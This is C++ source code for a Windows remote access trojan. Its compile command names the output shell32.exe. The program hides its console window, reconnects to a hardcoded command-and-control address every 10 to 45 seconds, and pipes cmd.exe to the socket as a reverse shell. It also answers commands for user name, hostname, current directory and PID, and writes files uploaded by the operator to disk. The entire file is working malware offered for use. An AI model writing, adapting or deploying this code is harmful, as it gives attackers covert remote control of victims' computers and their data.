// Main headers
#include <winsock2.h>
#include <windows.h>  //Used for WinApi calls
#include <ws2tcpip.h> //TCP-IP Sockets

#include <stdio.h>
#include <time.h>

#include <iostream> //Remove later for space

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


// to compile:
// i686-w64-mingw32-g++ wsarev.cpp -o shell32.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc


//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//# ======================================================================================================================================================================================
//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

// Functions, individual actions, and commands

// TODO:
// - ls
// - sleep (lie dormant for x amount of time: close socket, stop beaconing, etc.)

int upload(char *filename, char *content){
	errno = 0;
	FILE *outfile;
	outfile = fopen(filename, "w");
	if (!outfile) {
		return errno;
	}
	else {
		fwrite(content,strlen(content),1,outfile);
		fclose(outfile);
		return 0;
	}
}
void whoami(char *returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetUserNameA(returnval, &bufferlen);
}

void hostname(char *returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetComputerNameA(returnval, &bufferlen);
}

void pwd(char *returnval, int returnsize) // Module 2
{
    TCHAR tempvar[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, tempvar);
    strcat(returnval, tempvar);
}

DWORD getpid(){
	DWORD pid;
	pid = GetCurrentProcessId();
	return pid;
}

//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//# ======================================================================================================================================================================================
//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

void RAT(char* C2_Server, int C2_Port)
{
    srand(time(0));

    while (true)
    {
        Sleep((rand() % 45000) + 10000);    // Trys to reconnect every 10-45 seconds

        SOCKET tcp_sock;
        sockaddr_in addr;
        WSADATA wsa_version;

        WSAStartup(MAKEWORD(2,2), &wsa_version);
        tcp_sock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2_Server);  
        addr.sin_port = htons(C2_Port);

        // Initialize connection
        if (WSAConnect(tcp_sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(tcp_sock);
            WSACleanup();
            continue;
        }
        else // Analyze and wait for data upon successful connection
        {
            char CommandReceived[DEFAULT_BUFLEN] = "";
            memset(CommandReceived, 0, sizeof(CommandReceived));

            while (true)
            {
                int result = recv(tcp_sock, CommandReceived, DEFAULT_BUFLEN, 0);

                std::cout << "Command received: " << CommandReceived;
                std::cout << "Length of Command received: " << result << std::endl;

                if (result == -1)
                {
                    closesocket(tcp_sock);
                    WSACleanup();
                    std::cout << "Socket killed. WSA Cleaned. Sleep Start" << std::endl;
                    Sleep(1000);
                    std::cout << "Dying..." << std::endl;
                    exit(0);
                }

                char * command;
                char delim[] = " ";
                command = strtok(CommandReceived, delim);

                // Should only be used in individual interactive environments == TBC
                if ((strcmp(command, "shell") == 0))
                {
                    // Load CMD.EXE as a process var
                    char Process[] = "cmd.exe";
                    STARTUPINFO sinfo;
                    PROCESS_INFORMATION pinfo;

                    // Allocate and execute
                    memset(&sinfo, 0, sizeof(sinfo));
                    sinfo.cb = sizeof(sinfo);
                    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);                  // Set flags
                    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcp_sock;       // Redirect fd's to socket

                    // Create process and attach the process var to it
                    CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

                    // We are here, hanging in the cmd.exe process until it is closed by a TERM or exit command
                    WaitForSingleObject(pinfo.hProcess, INFINITE); 

                    // Cleanup correctly
                    CloseHandle(pinfo.hProcess);
                    CloseHandle(pinfo.hThread);

                    //memset(CommandReceived, 0, sizeof(CommandReceived));

                    // When the process exits, we send an agent-msg over to alert the C2
                    char buffer[64] = "";
                    strcat(buffer,"Exiting shell\n");

                    // Send message
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    // Clear buffers
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if ((strcmp(command, "operating-system-probe") == 0))
                {
                    // Load OS type into buffer
                    char buffer[257] = "";
                    strcat(buffer, "d2luZG93cw");      // Windows
                    //strcat(buffer, "\n");

                    // Send message
                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);

                    // Clear buffers
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if ((strcmp(command, "whoami") == 0))
                {
                    // Load buffer, exec Whoami function and load output into buffer
                    char buffer[257] = "";
                    whoami(buffer, 257);
                    strcat(buffer, "\n");

                    // send message
                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);

                    // Clear buffers
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if ((strcmp(command, "hostname") == 0))
                {
                    // Load buffer, exec Hostname function
                    char buffer[257] = "";
                    hostname(buffer, 257);
                    strcat(buffer, "\n");

                    // Send message
                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);

                    // Clear buffers
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if ((strcmp(command, "pwd") == 0))
                {
                    // Load buffer, exec PrintWorkingDirectory (PWD) function
                    char buffer[257] = "";
                    pwd(buffer, 257);
                    strcat(buffer, "\n");

                    // Send message
                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);

                    // Clear buffers
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if ((strcmp(command, "getpid") == 0))
                {   
                    // Exec function, load output into var
                    DWORD pid;
                    char char_pid[6];
                    pid = getpid();

                    // Convert DWORD to char (using base 10)
                    _ultoa(pid,char_pid,10);

                    // Load message
                    char buffer[20] = "";
                    strcat(buffer, "Current PID: ");
                    strcat(buffer, char_pid);
                    strcat(buffer, "\n");

                    // Send message
                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);

                    // Clear buffers
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if (strcmp(command, "ping") == 0)
                {
                    // Send intelligent reply
                    char buffer[64] = "";
                    strcat(buffer,"PONG\n");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    // Clear buffers
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
			    }
                else if (strcmp(command, "beacon-probe") == 0)
                {
                    // Send beacon string to show success
                    char buffer[128] = "";
                    strcat(buffer,"d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    // Clear buffers
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
			    }
                else if (strcmp(command, "exit") == 0)
                {
                    // Send return code - OK
                    char buffer[64] = "";
                    strcat(buffer,"c2xlZXBpbmc");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    // Close connection, Kill process
                    closesocket(tcp_sock);
                    WSACleanup();
                    std::cout << "Socket killed. WSA Cleaned. Sleep Start" << std::endl;
                    Sleep(1000);
                    std::cout << "Sleep End... Returning" << std::endl;
                    break;
                }
                else if (strcmp(command, "kill") == 0) 
                {
                    char buffer[64] = "";
                    strcat(buffer,"ZGVhZA");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    closesocket(tcp_sock);
                    WSACleanup();
                    std::cout << "Socket killed. WSA Cleaned. Sleep Start" << std::endl;
                    Sleep(1000);
                    std::cout << "Dying..." << std::endl;
                    exit(0);
			    }
                else if (strcmp(command, "upload") == 0) {
			
                    char * filename = strtok(NULL, delim);
                    char * data_length = strtok(NULL, delim);
                    int data_length_int = atoi(data_length);
                    
                    // receiving data
                    char base64file[data_length_int];
                    memset(base64file, 0, sizeof(base64file));
                    
                    char buffer[255] = "";
                    strcat(buffer, "[!] Saving file in Base64 format as ");
                    strcat(buffer, filename);
                    strcat(buffer, "\n");
                    strcat(buffer, "    Decode it using:\n\n\tcertutil -decode c:\\foo.asc c:\\foo.exe");
                    strcat(buffer, "    \n\tOR\n\tcat foo.asc | base64 -d > foo");

                    
                    send(tcp_sock, buffer, strlen(buffer)+1,0); // send response
                    
                    int recv_result = recv(tcp_sock, base64file, data_length_int, 0);

                    if (recv_result <= 0)
                    {
                        closesocket(tcp_sock);
                        std::cout << "Error received during upload procedure. Socket killed. Sleep Start" << std::endl;
                        Sleep(1000);
                        std::cout << "Returning to loop..." << std::endl;     
                        break;               
                    }

                    // uploading
                    int file_result;
                    file_result = upload(filename,base64file);
                    
                    // C&C part
                    memset(buffer, 0, sizeof(buffer));
                    if (file_result == 0) {
                        strcat(buffer,"\n[+] Uploaded: "); 
                        strcat(buffer,filename); 
                    }
                    else { 
                        strcat(buffer,"\n[-] Failed to write file. Errno from fopen: "); 

                        // parse errno
                        char errnos[2];
                        memset(errnos,0,2);
                        _itoa(file_result,errnos,10);
                        strcat(buffer,errnos);
                    }
                    strcat(buffer,"\n");
                    
                    // Send result info
                    send(tcp_sock,buffer,strlen(buffer)+1,0);

                    // Clear buffers
                    memset(base64file, 0, sizeof(base64file));
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived)); 
                }
                else
                {
                    // Send notice of validity
                    char buffer[64] = "";
                    strcat(buffer,"Invalid Command\n");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    // Clear buffers
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                
            }
        }
    }
}

//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//# ======================================================================================================================================================================================
//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

int main(int argc, char **argv) {

    HWND stealth;                                       //Declare a window handle 
    AllocConsole();                                     //Allocate a new console
    stealth=FindWindowA("ConsoleWindowClass",NULL);     //Find the previous Window handler and hide/show the window depending upon the next command
    ShowWindow(stealth,SW_HIDE);                        //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console

    // FreeConsole();
    if (argc == 3) 
    {
        int port  = atoi(argv[2]); 
        RAT(argv[1], port);
    }
    else {
        char host[] = "192.168.75.100";                  // change this to your ip address
        int port = 1337;                                // change this to your open port
        RAT(host, port);
    }
    return 0;
}
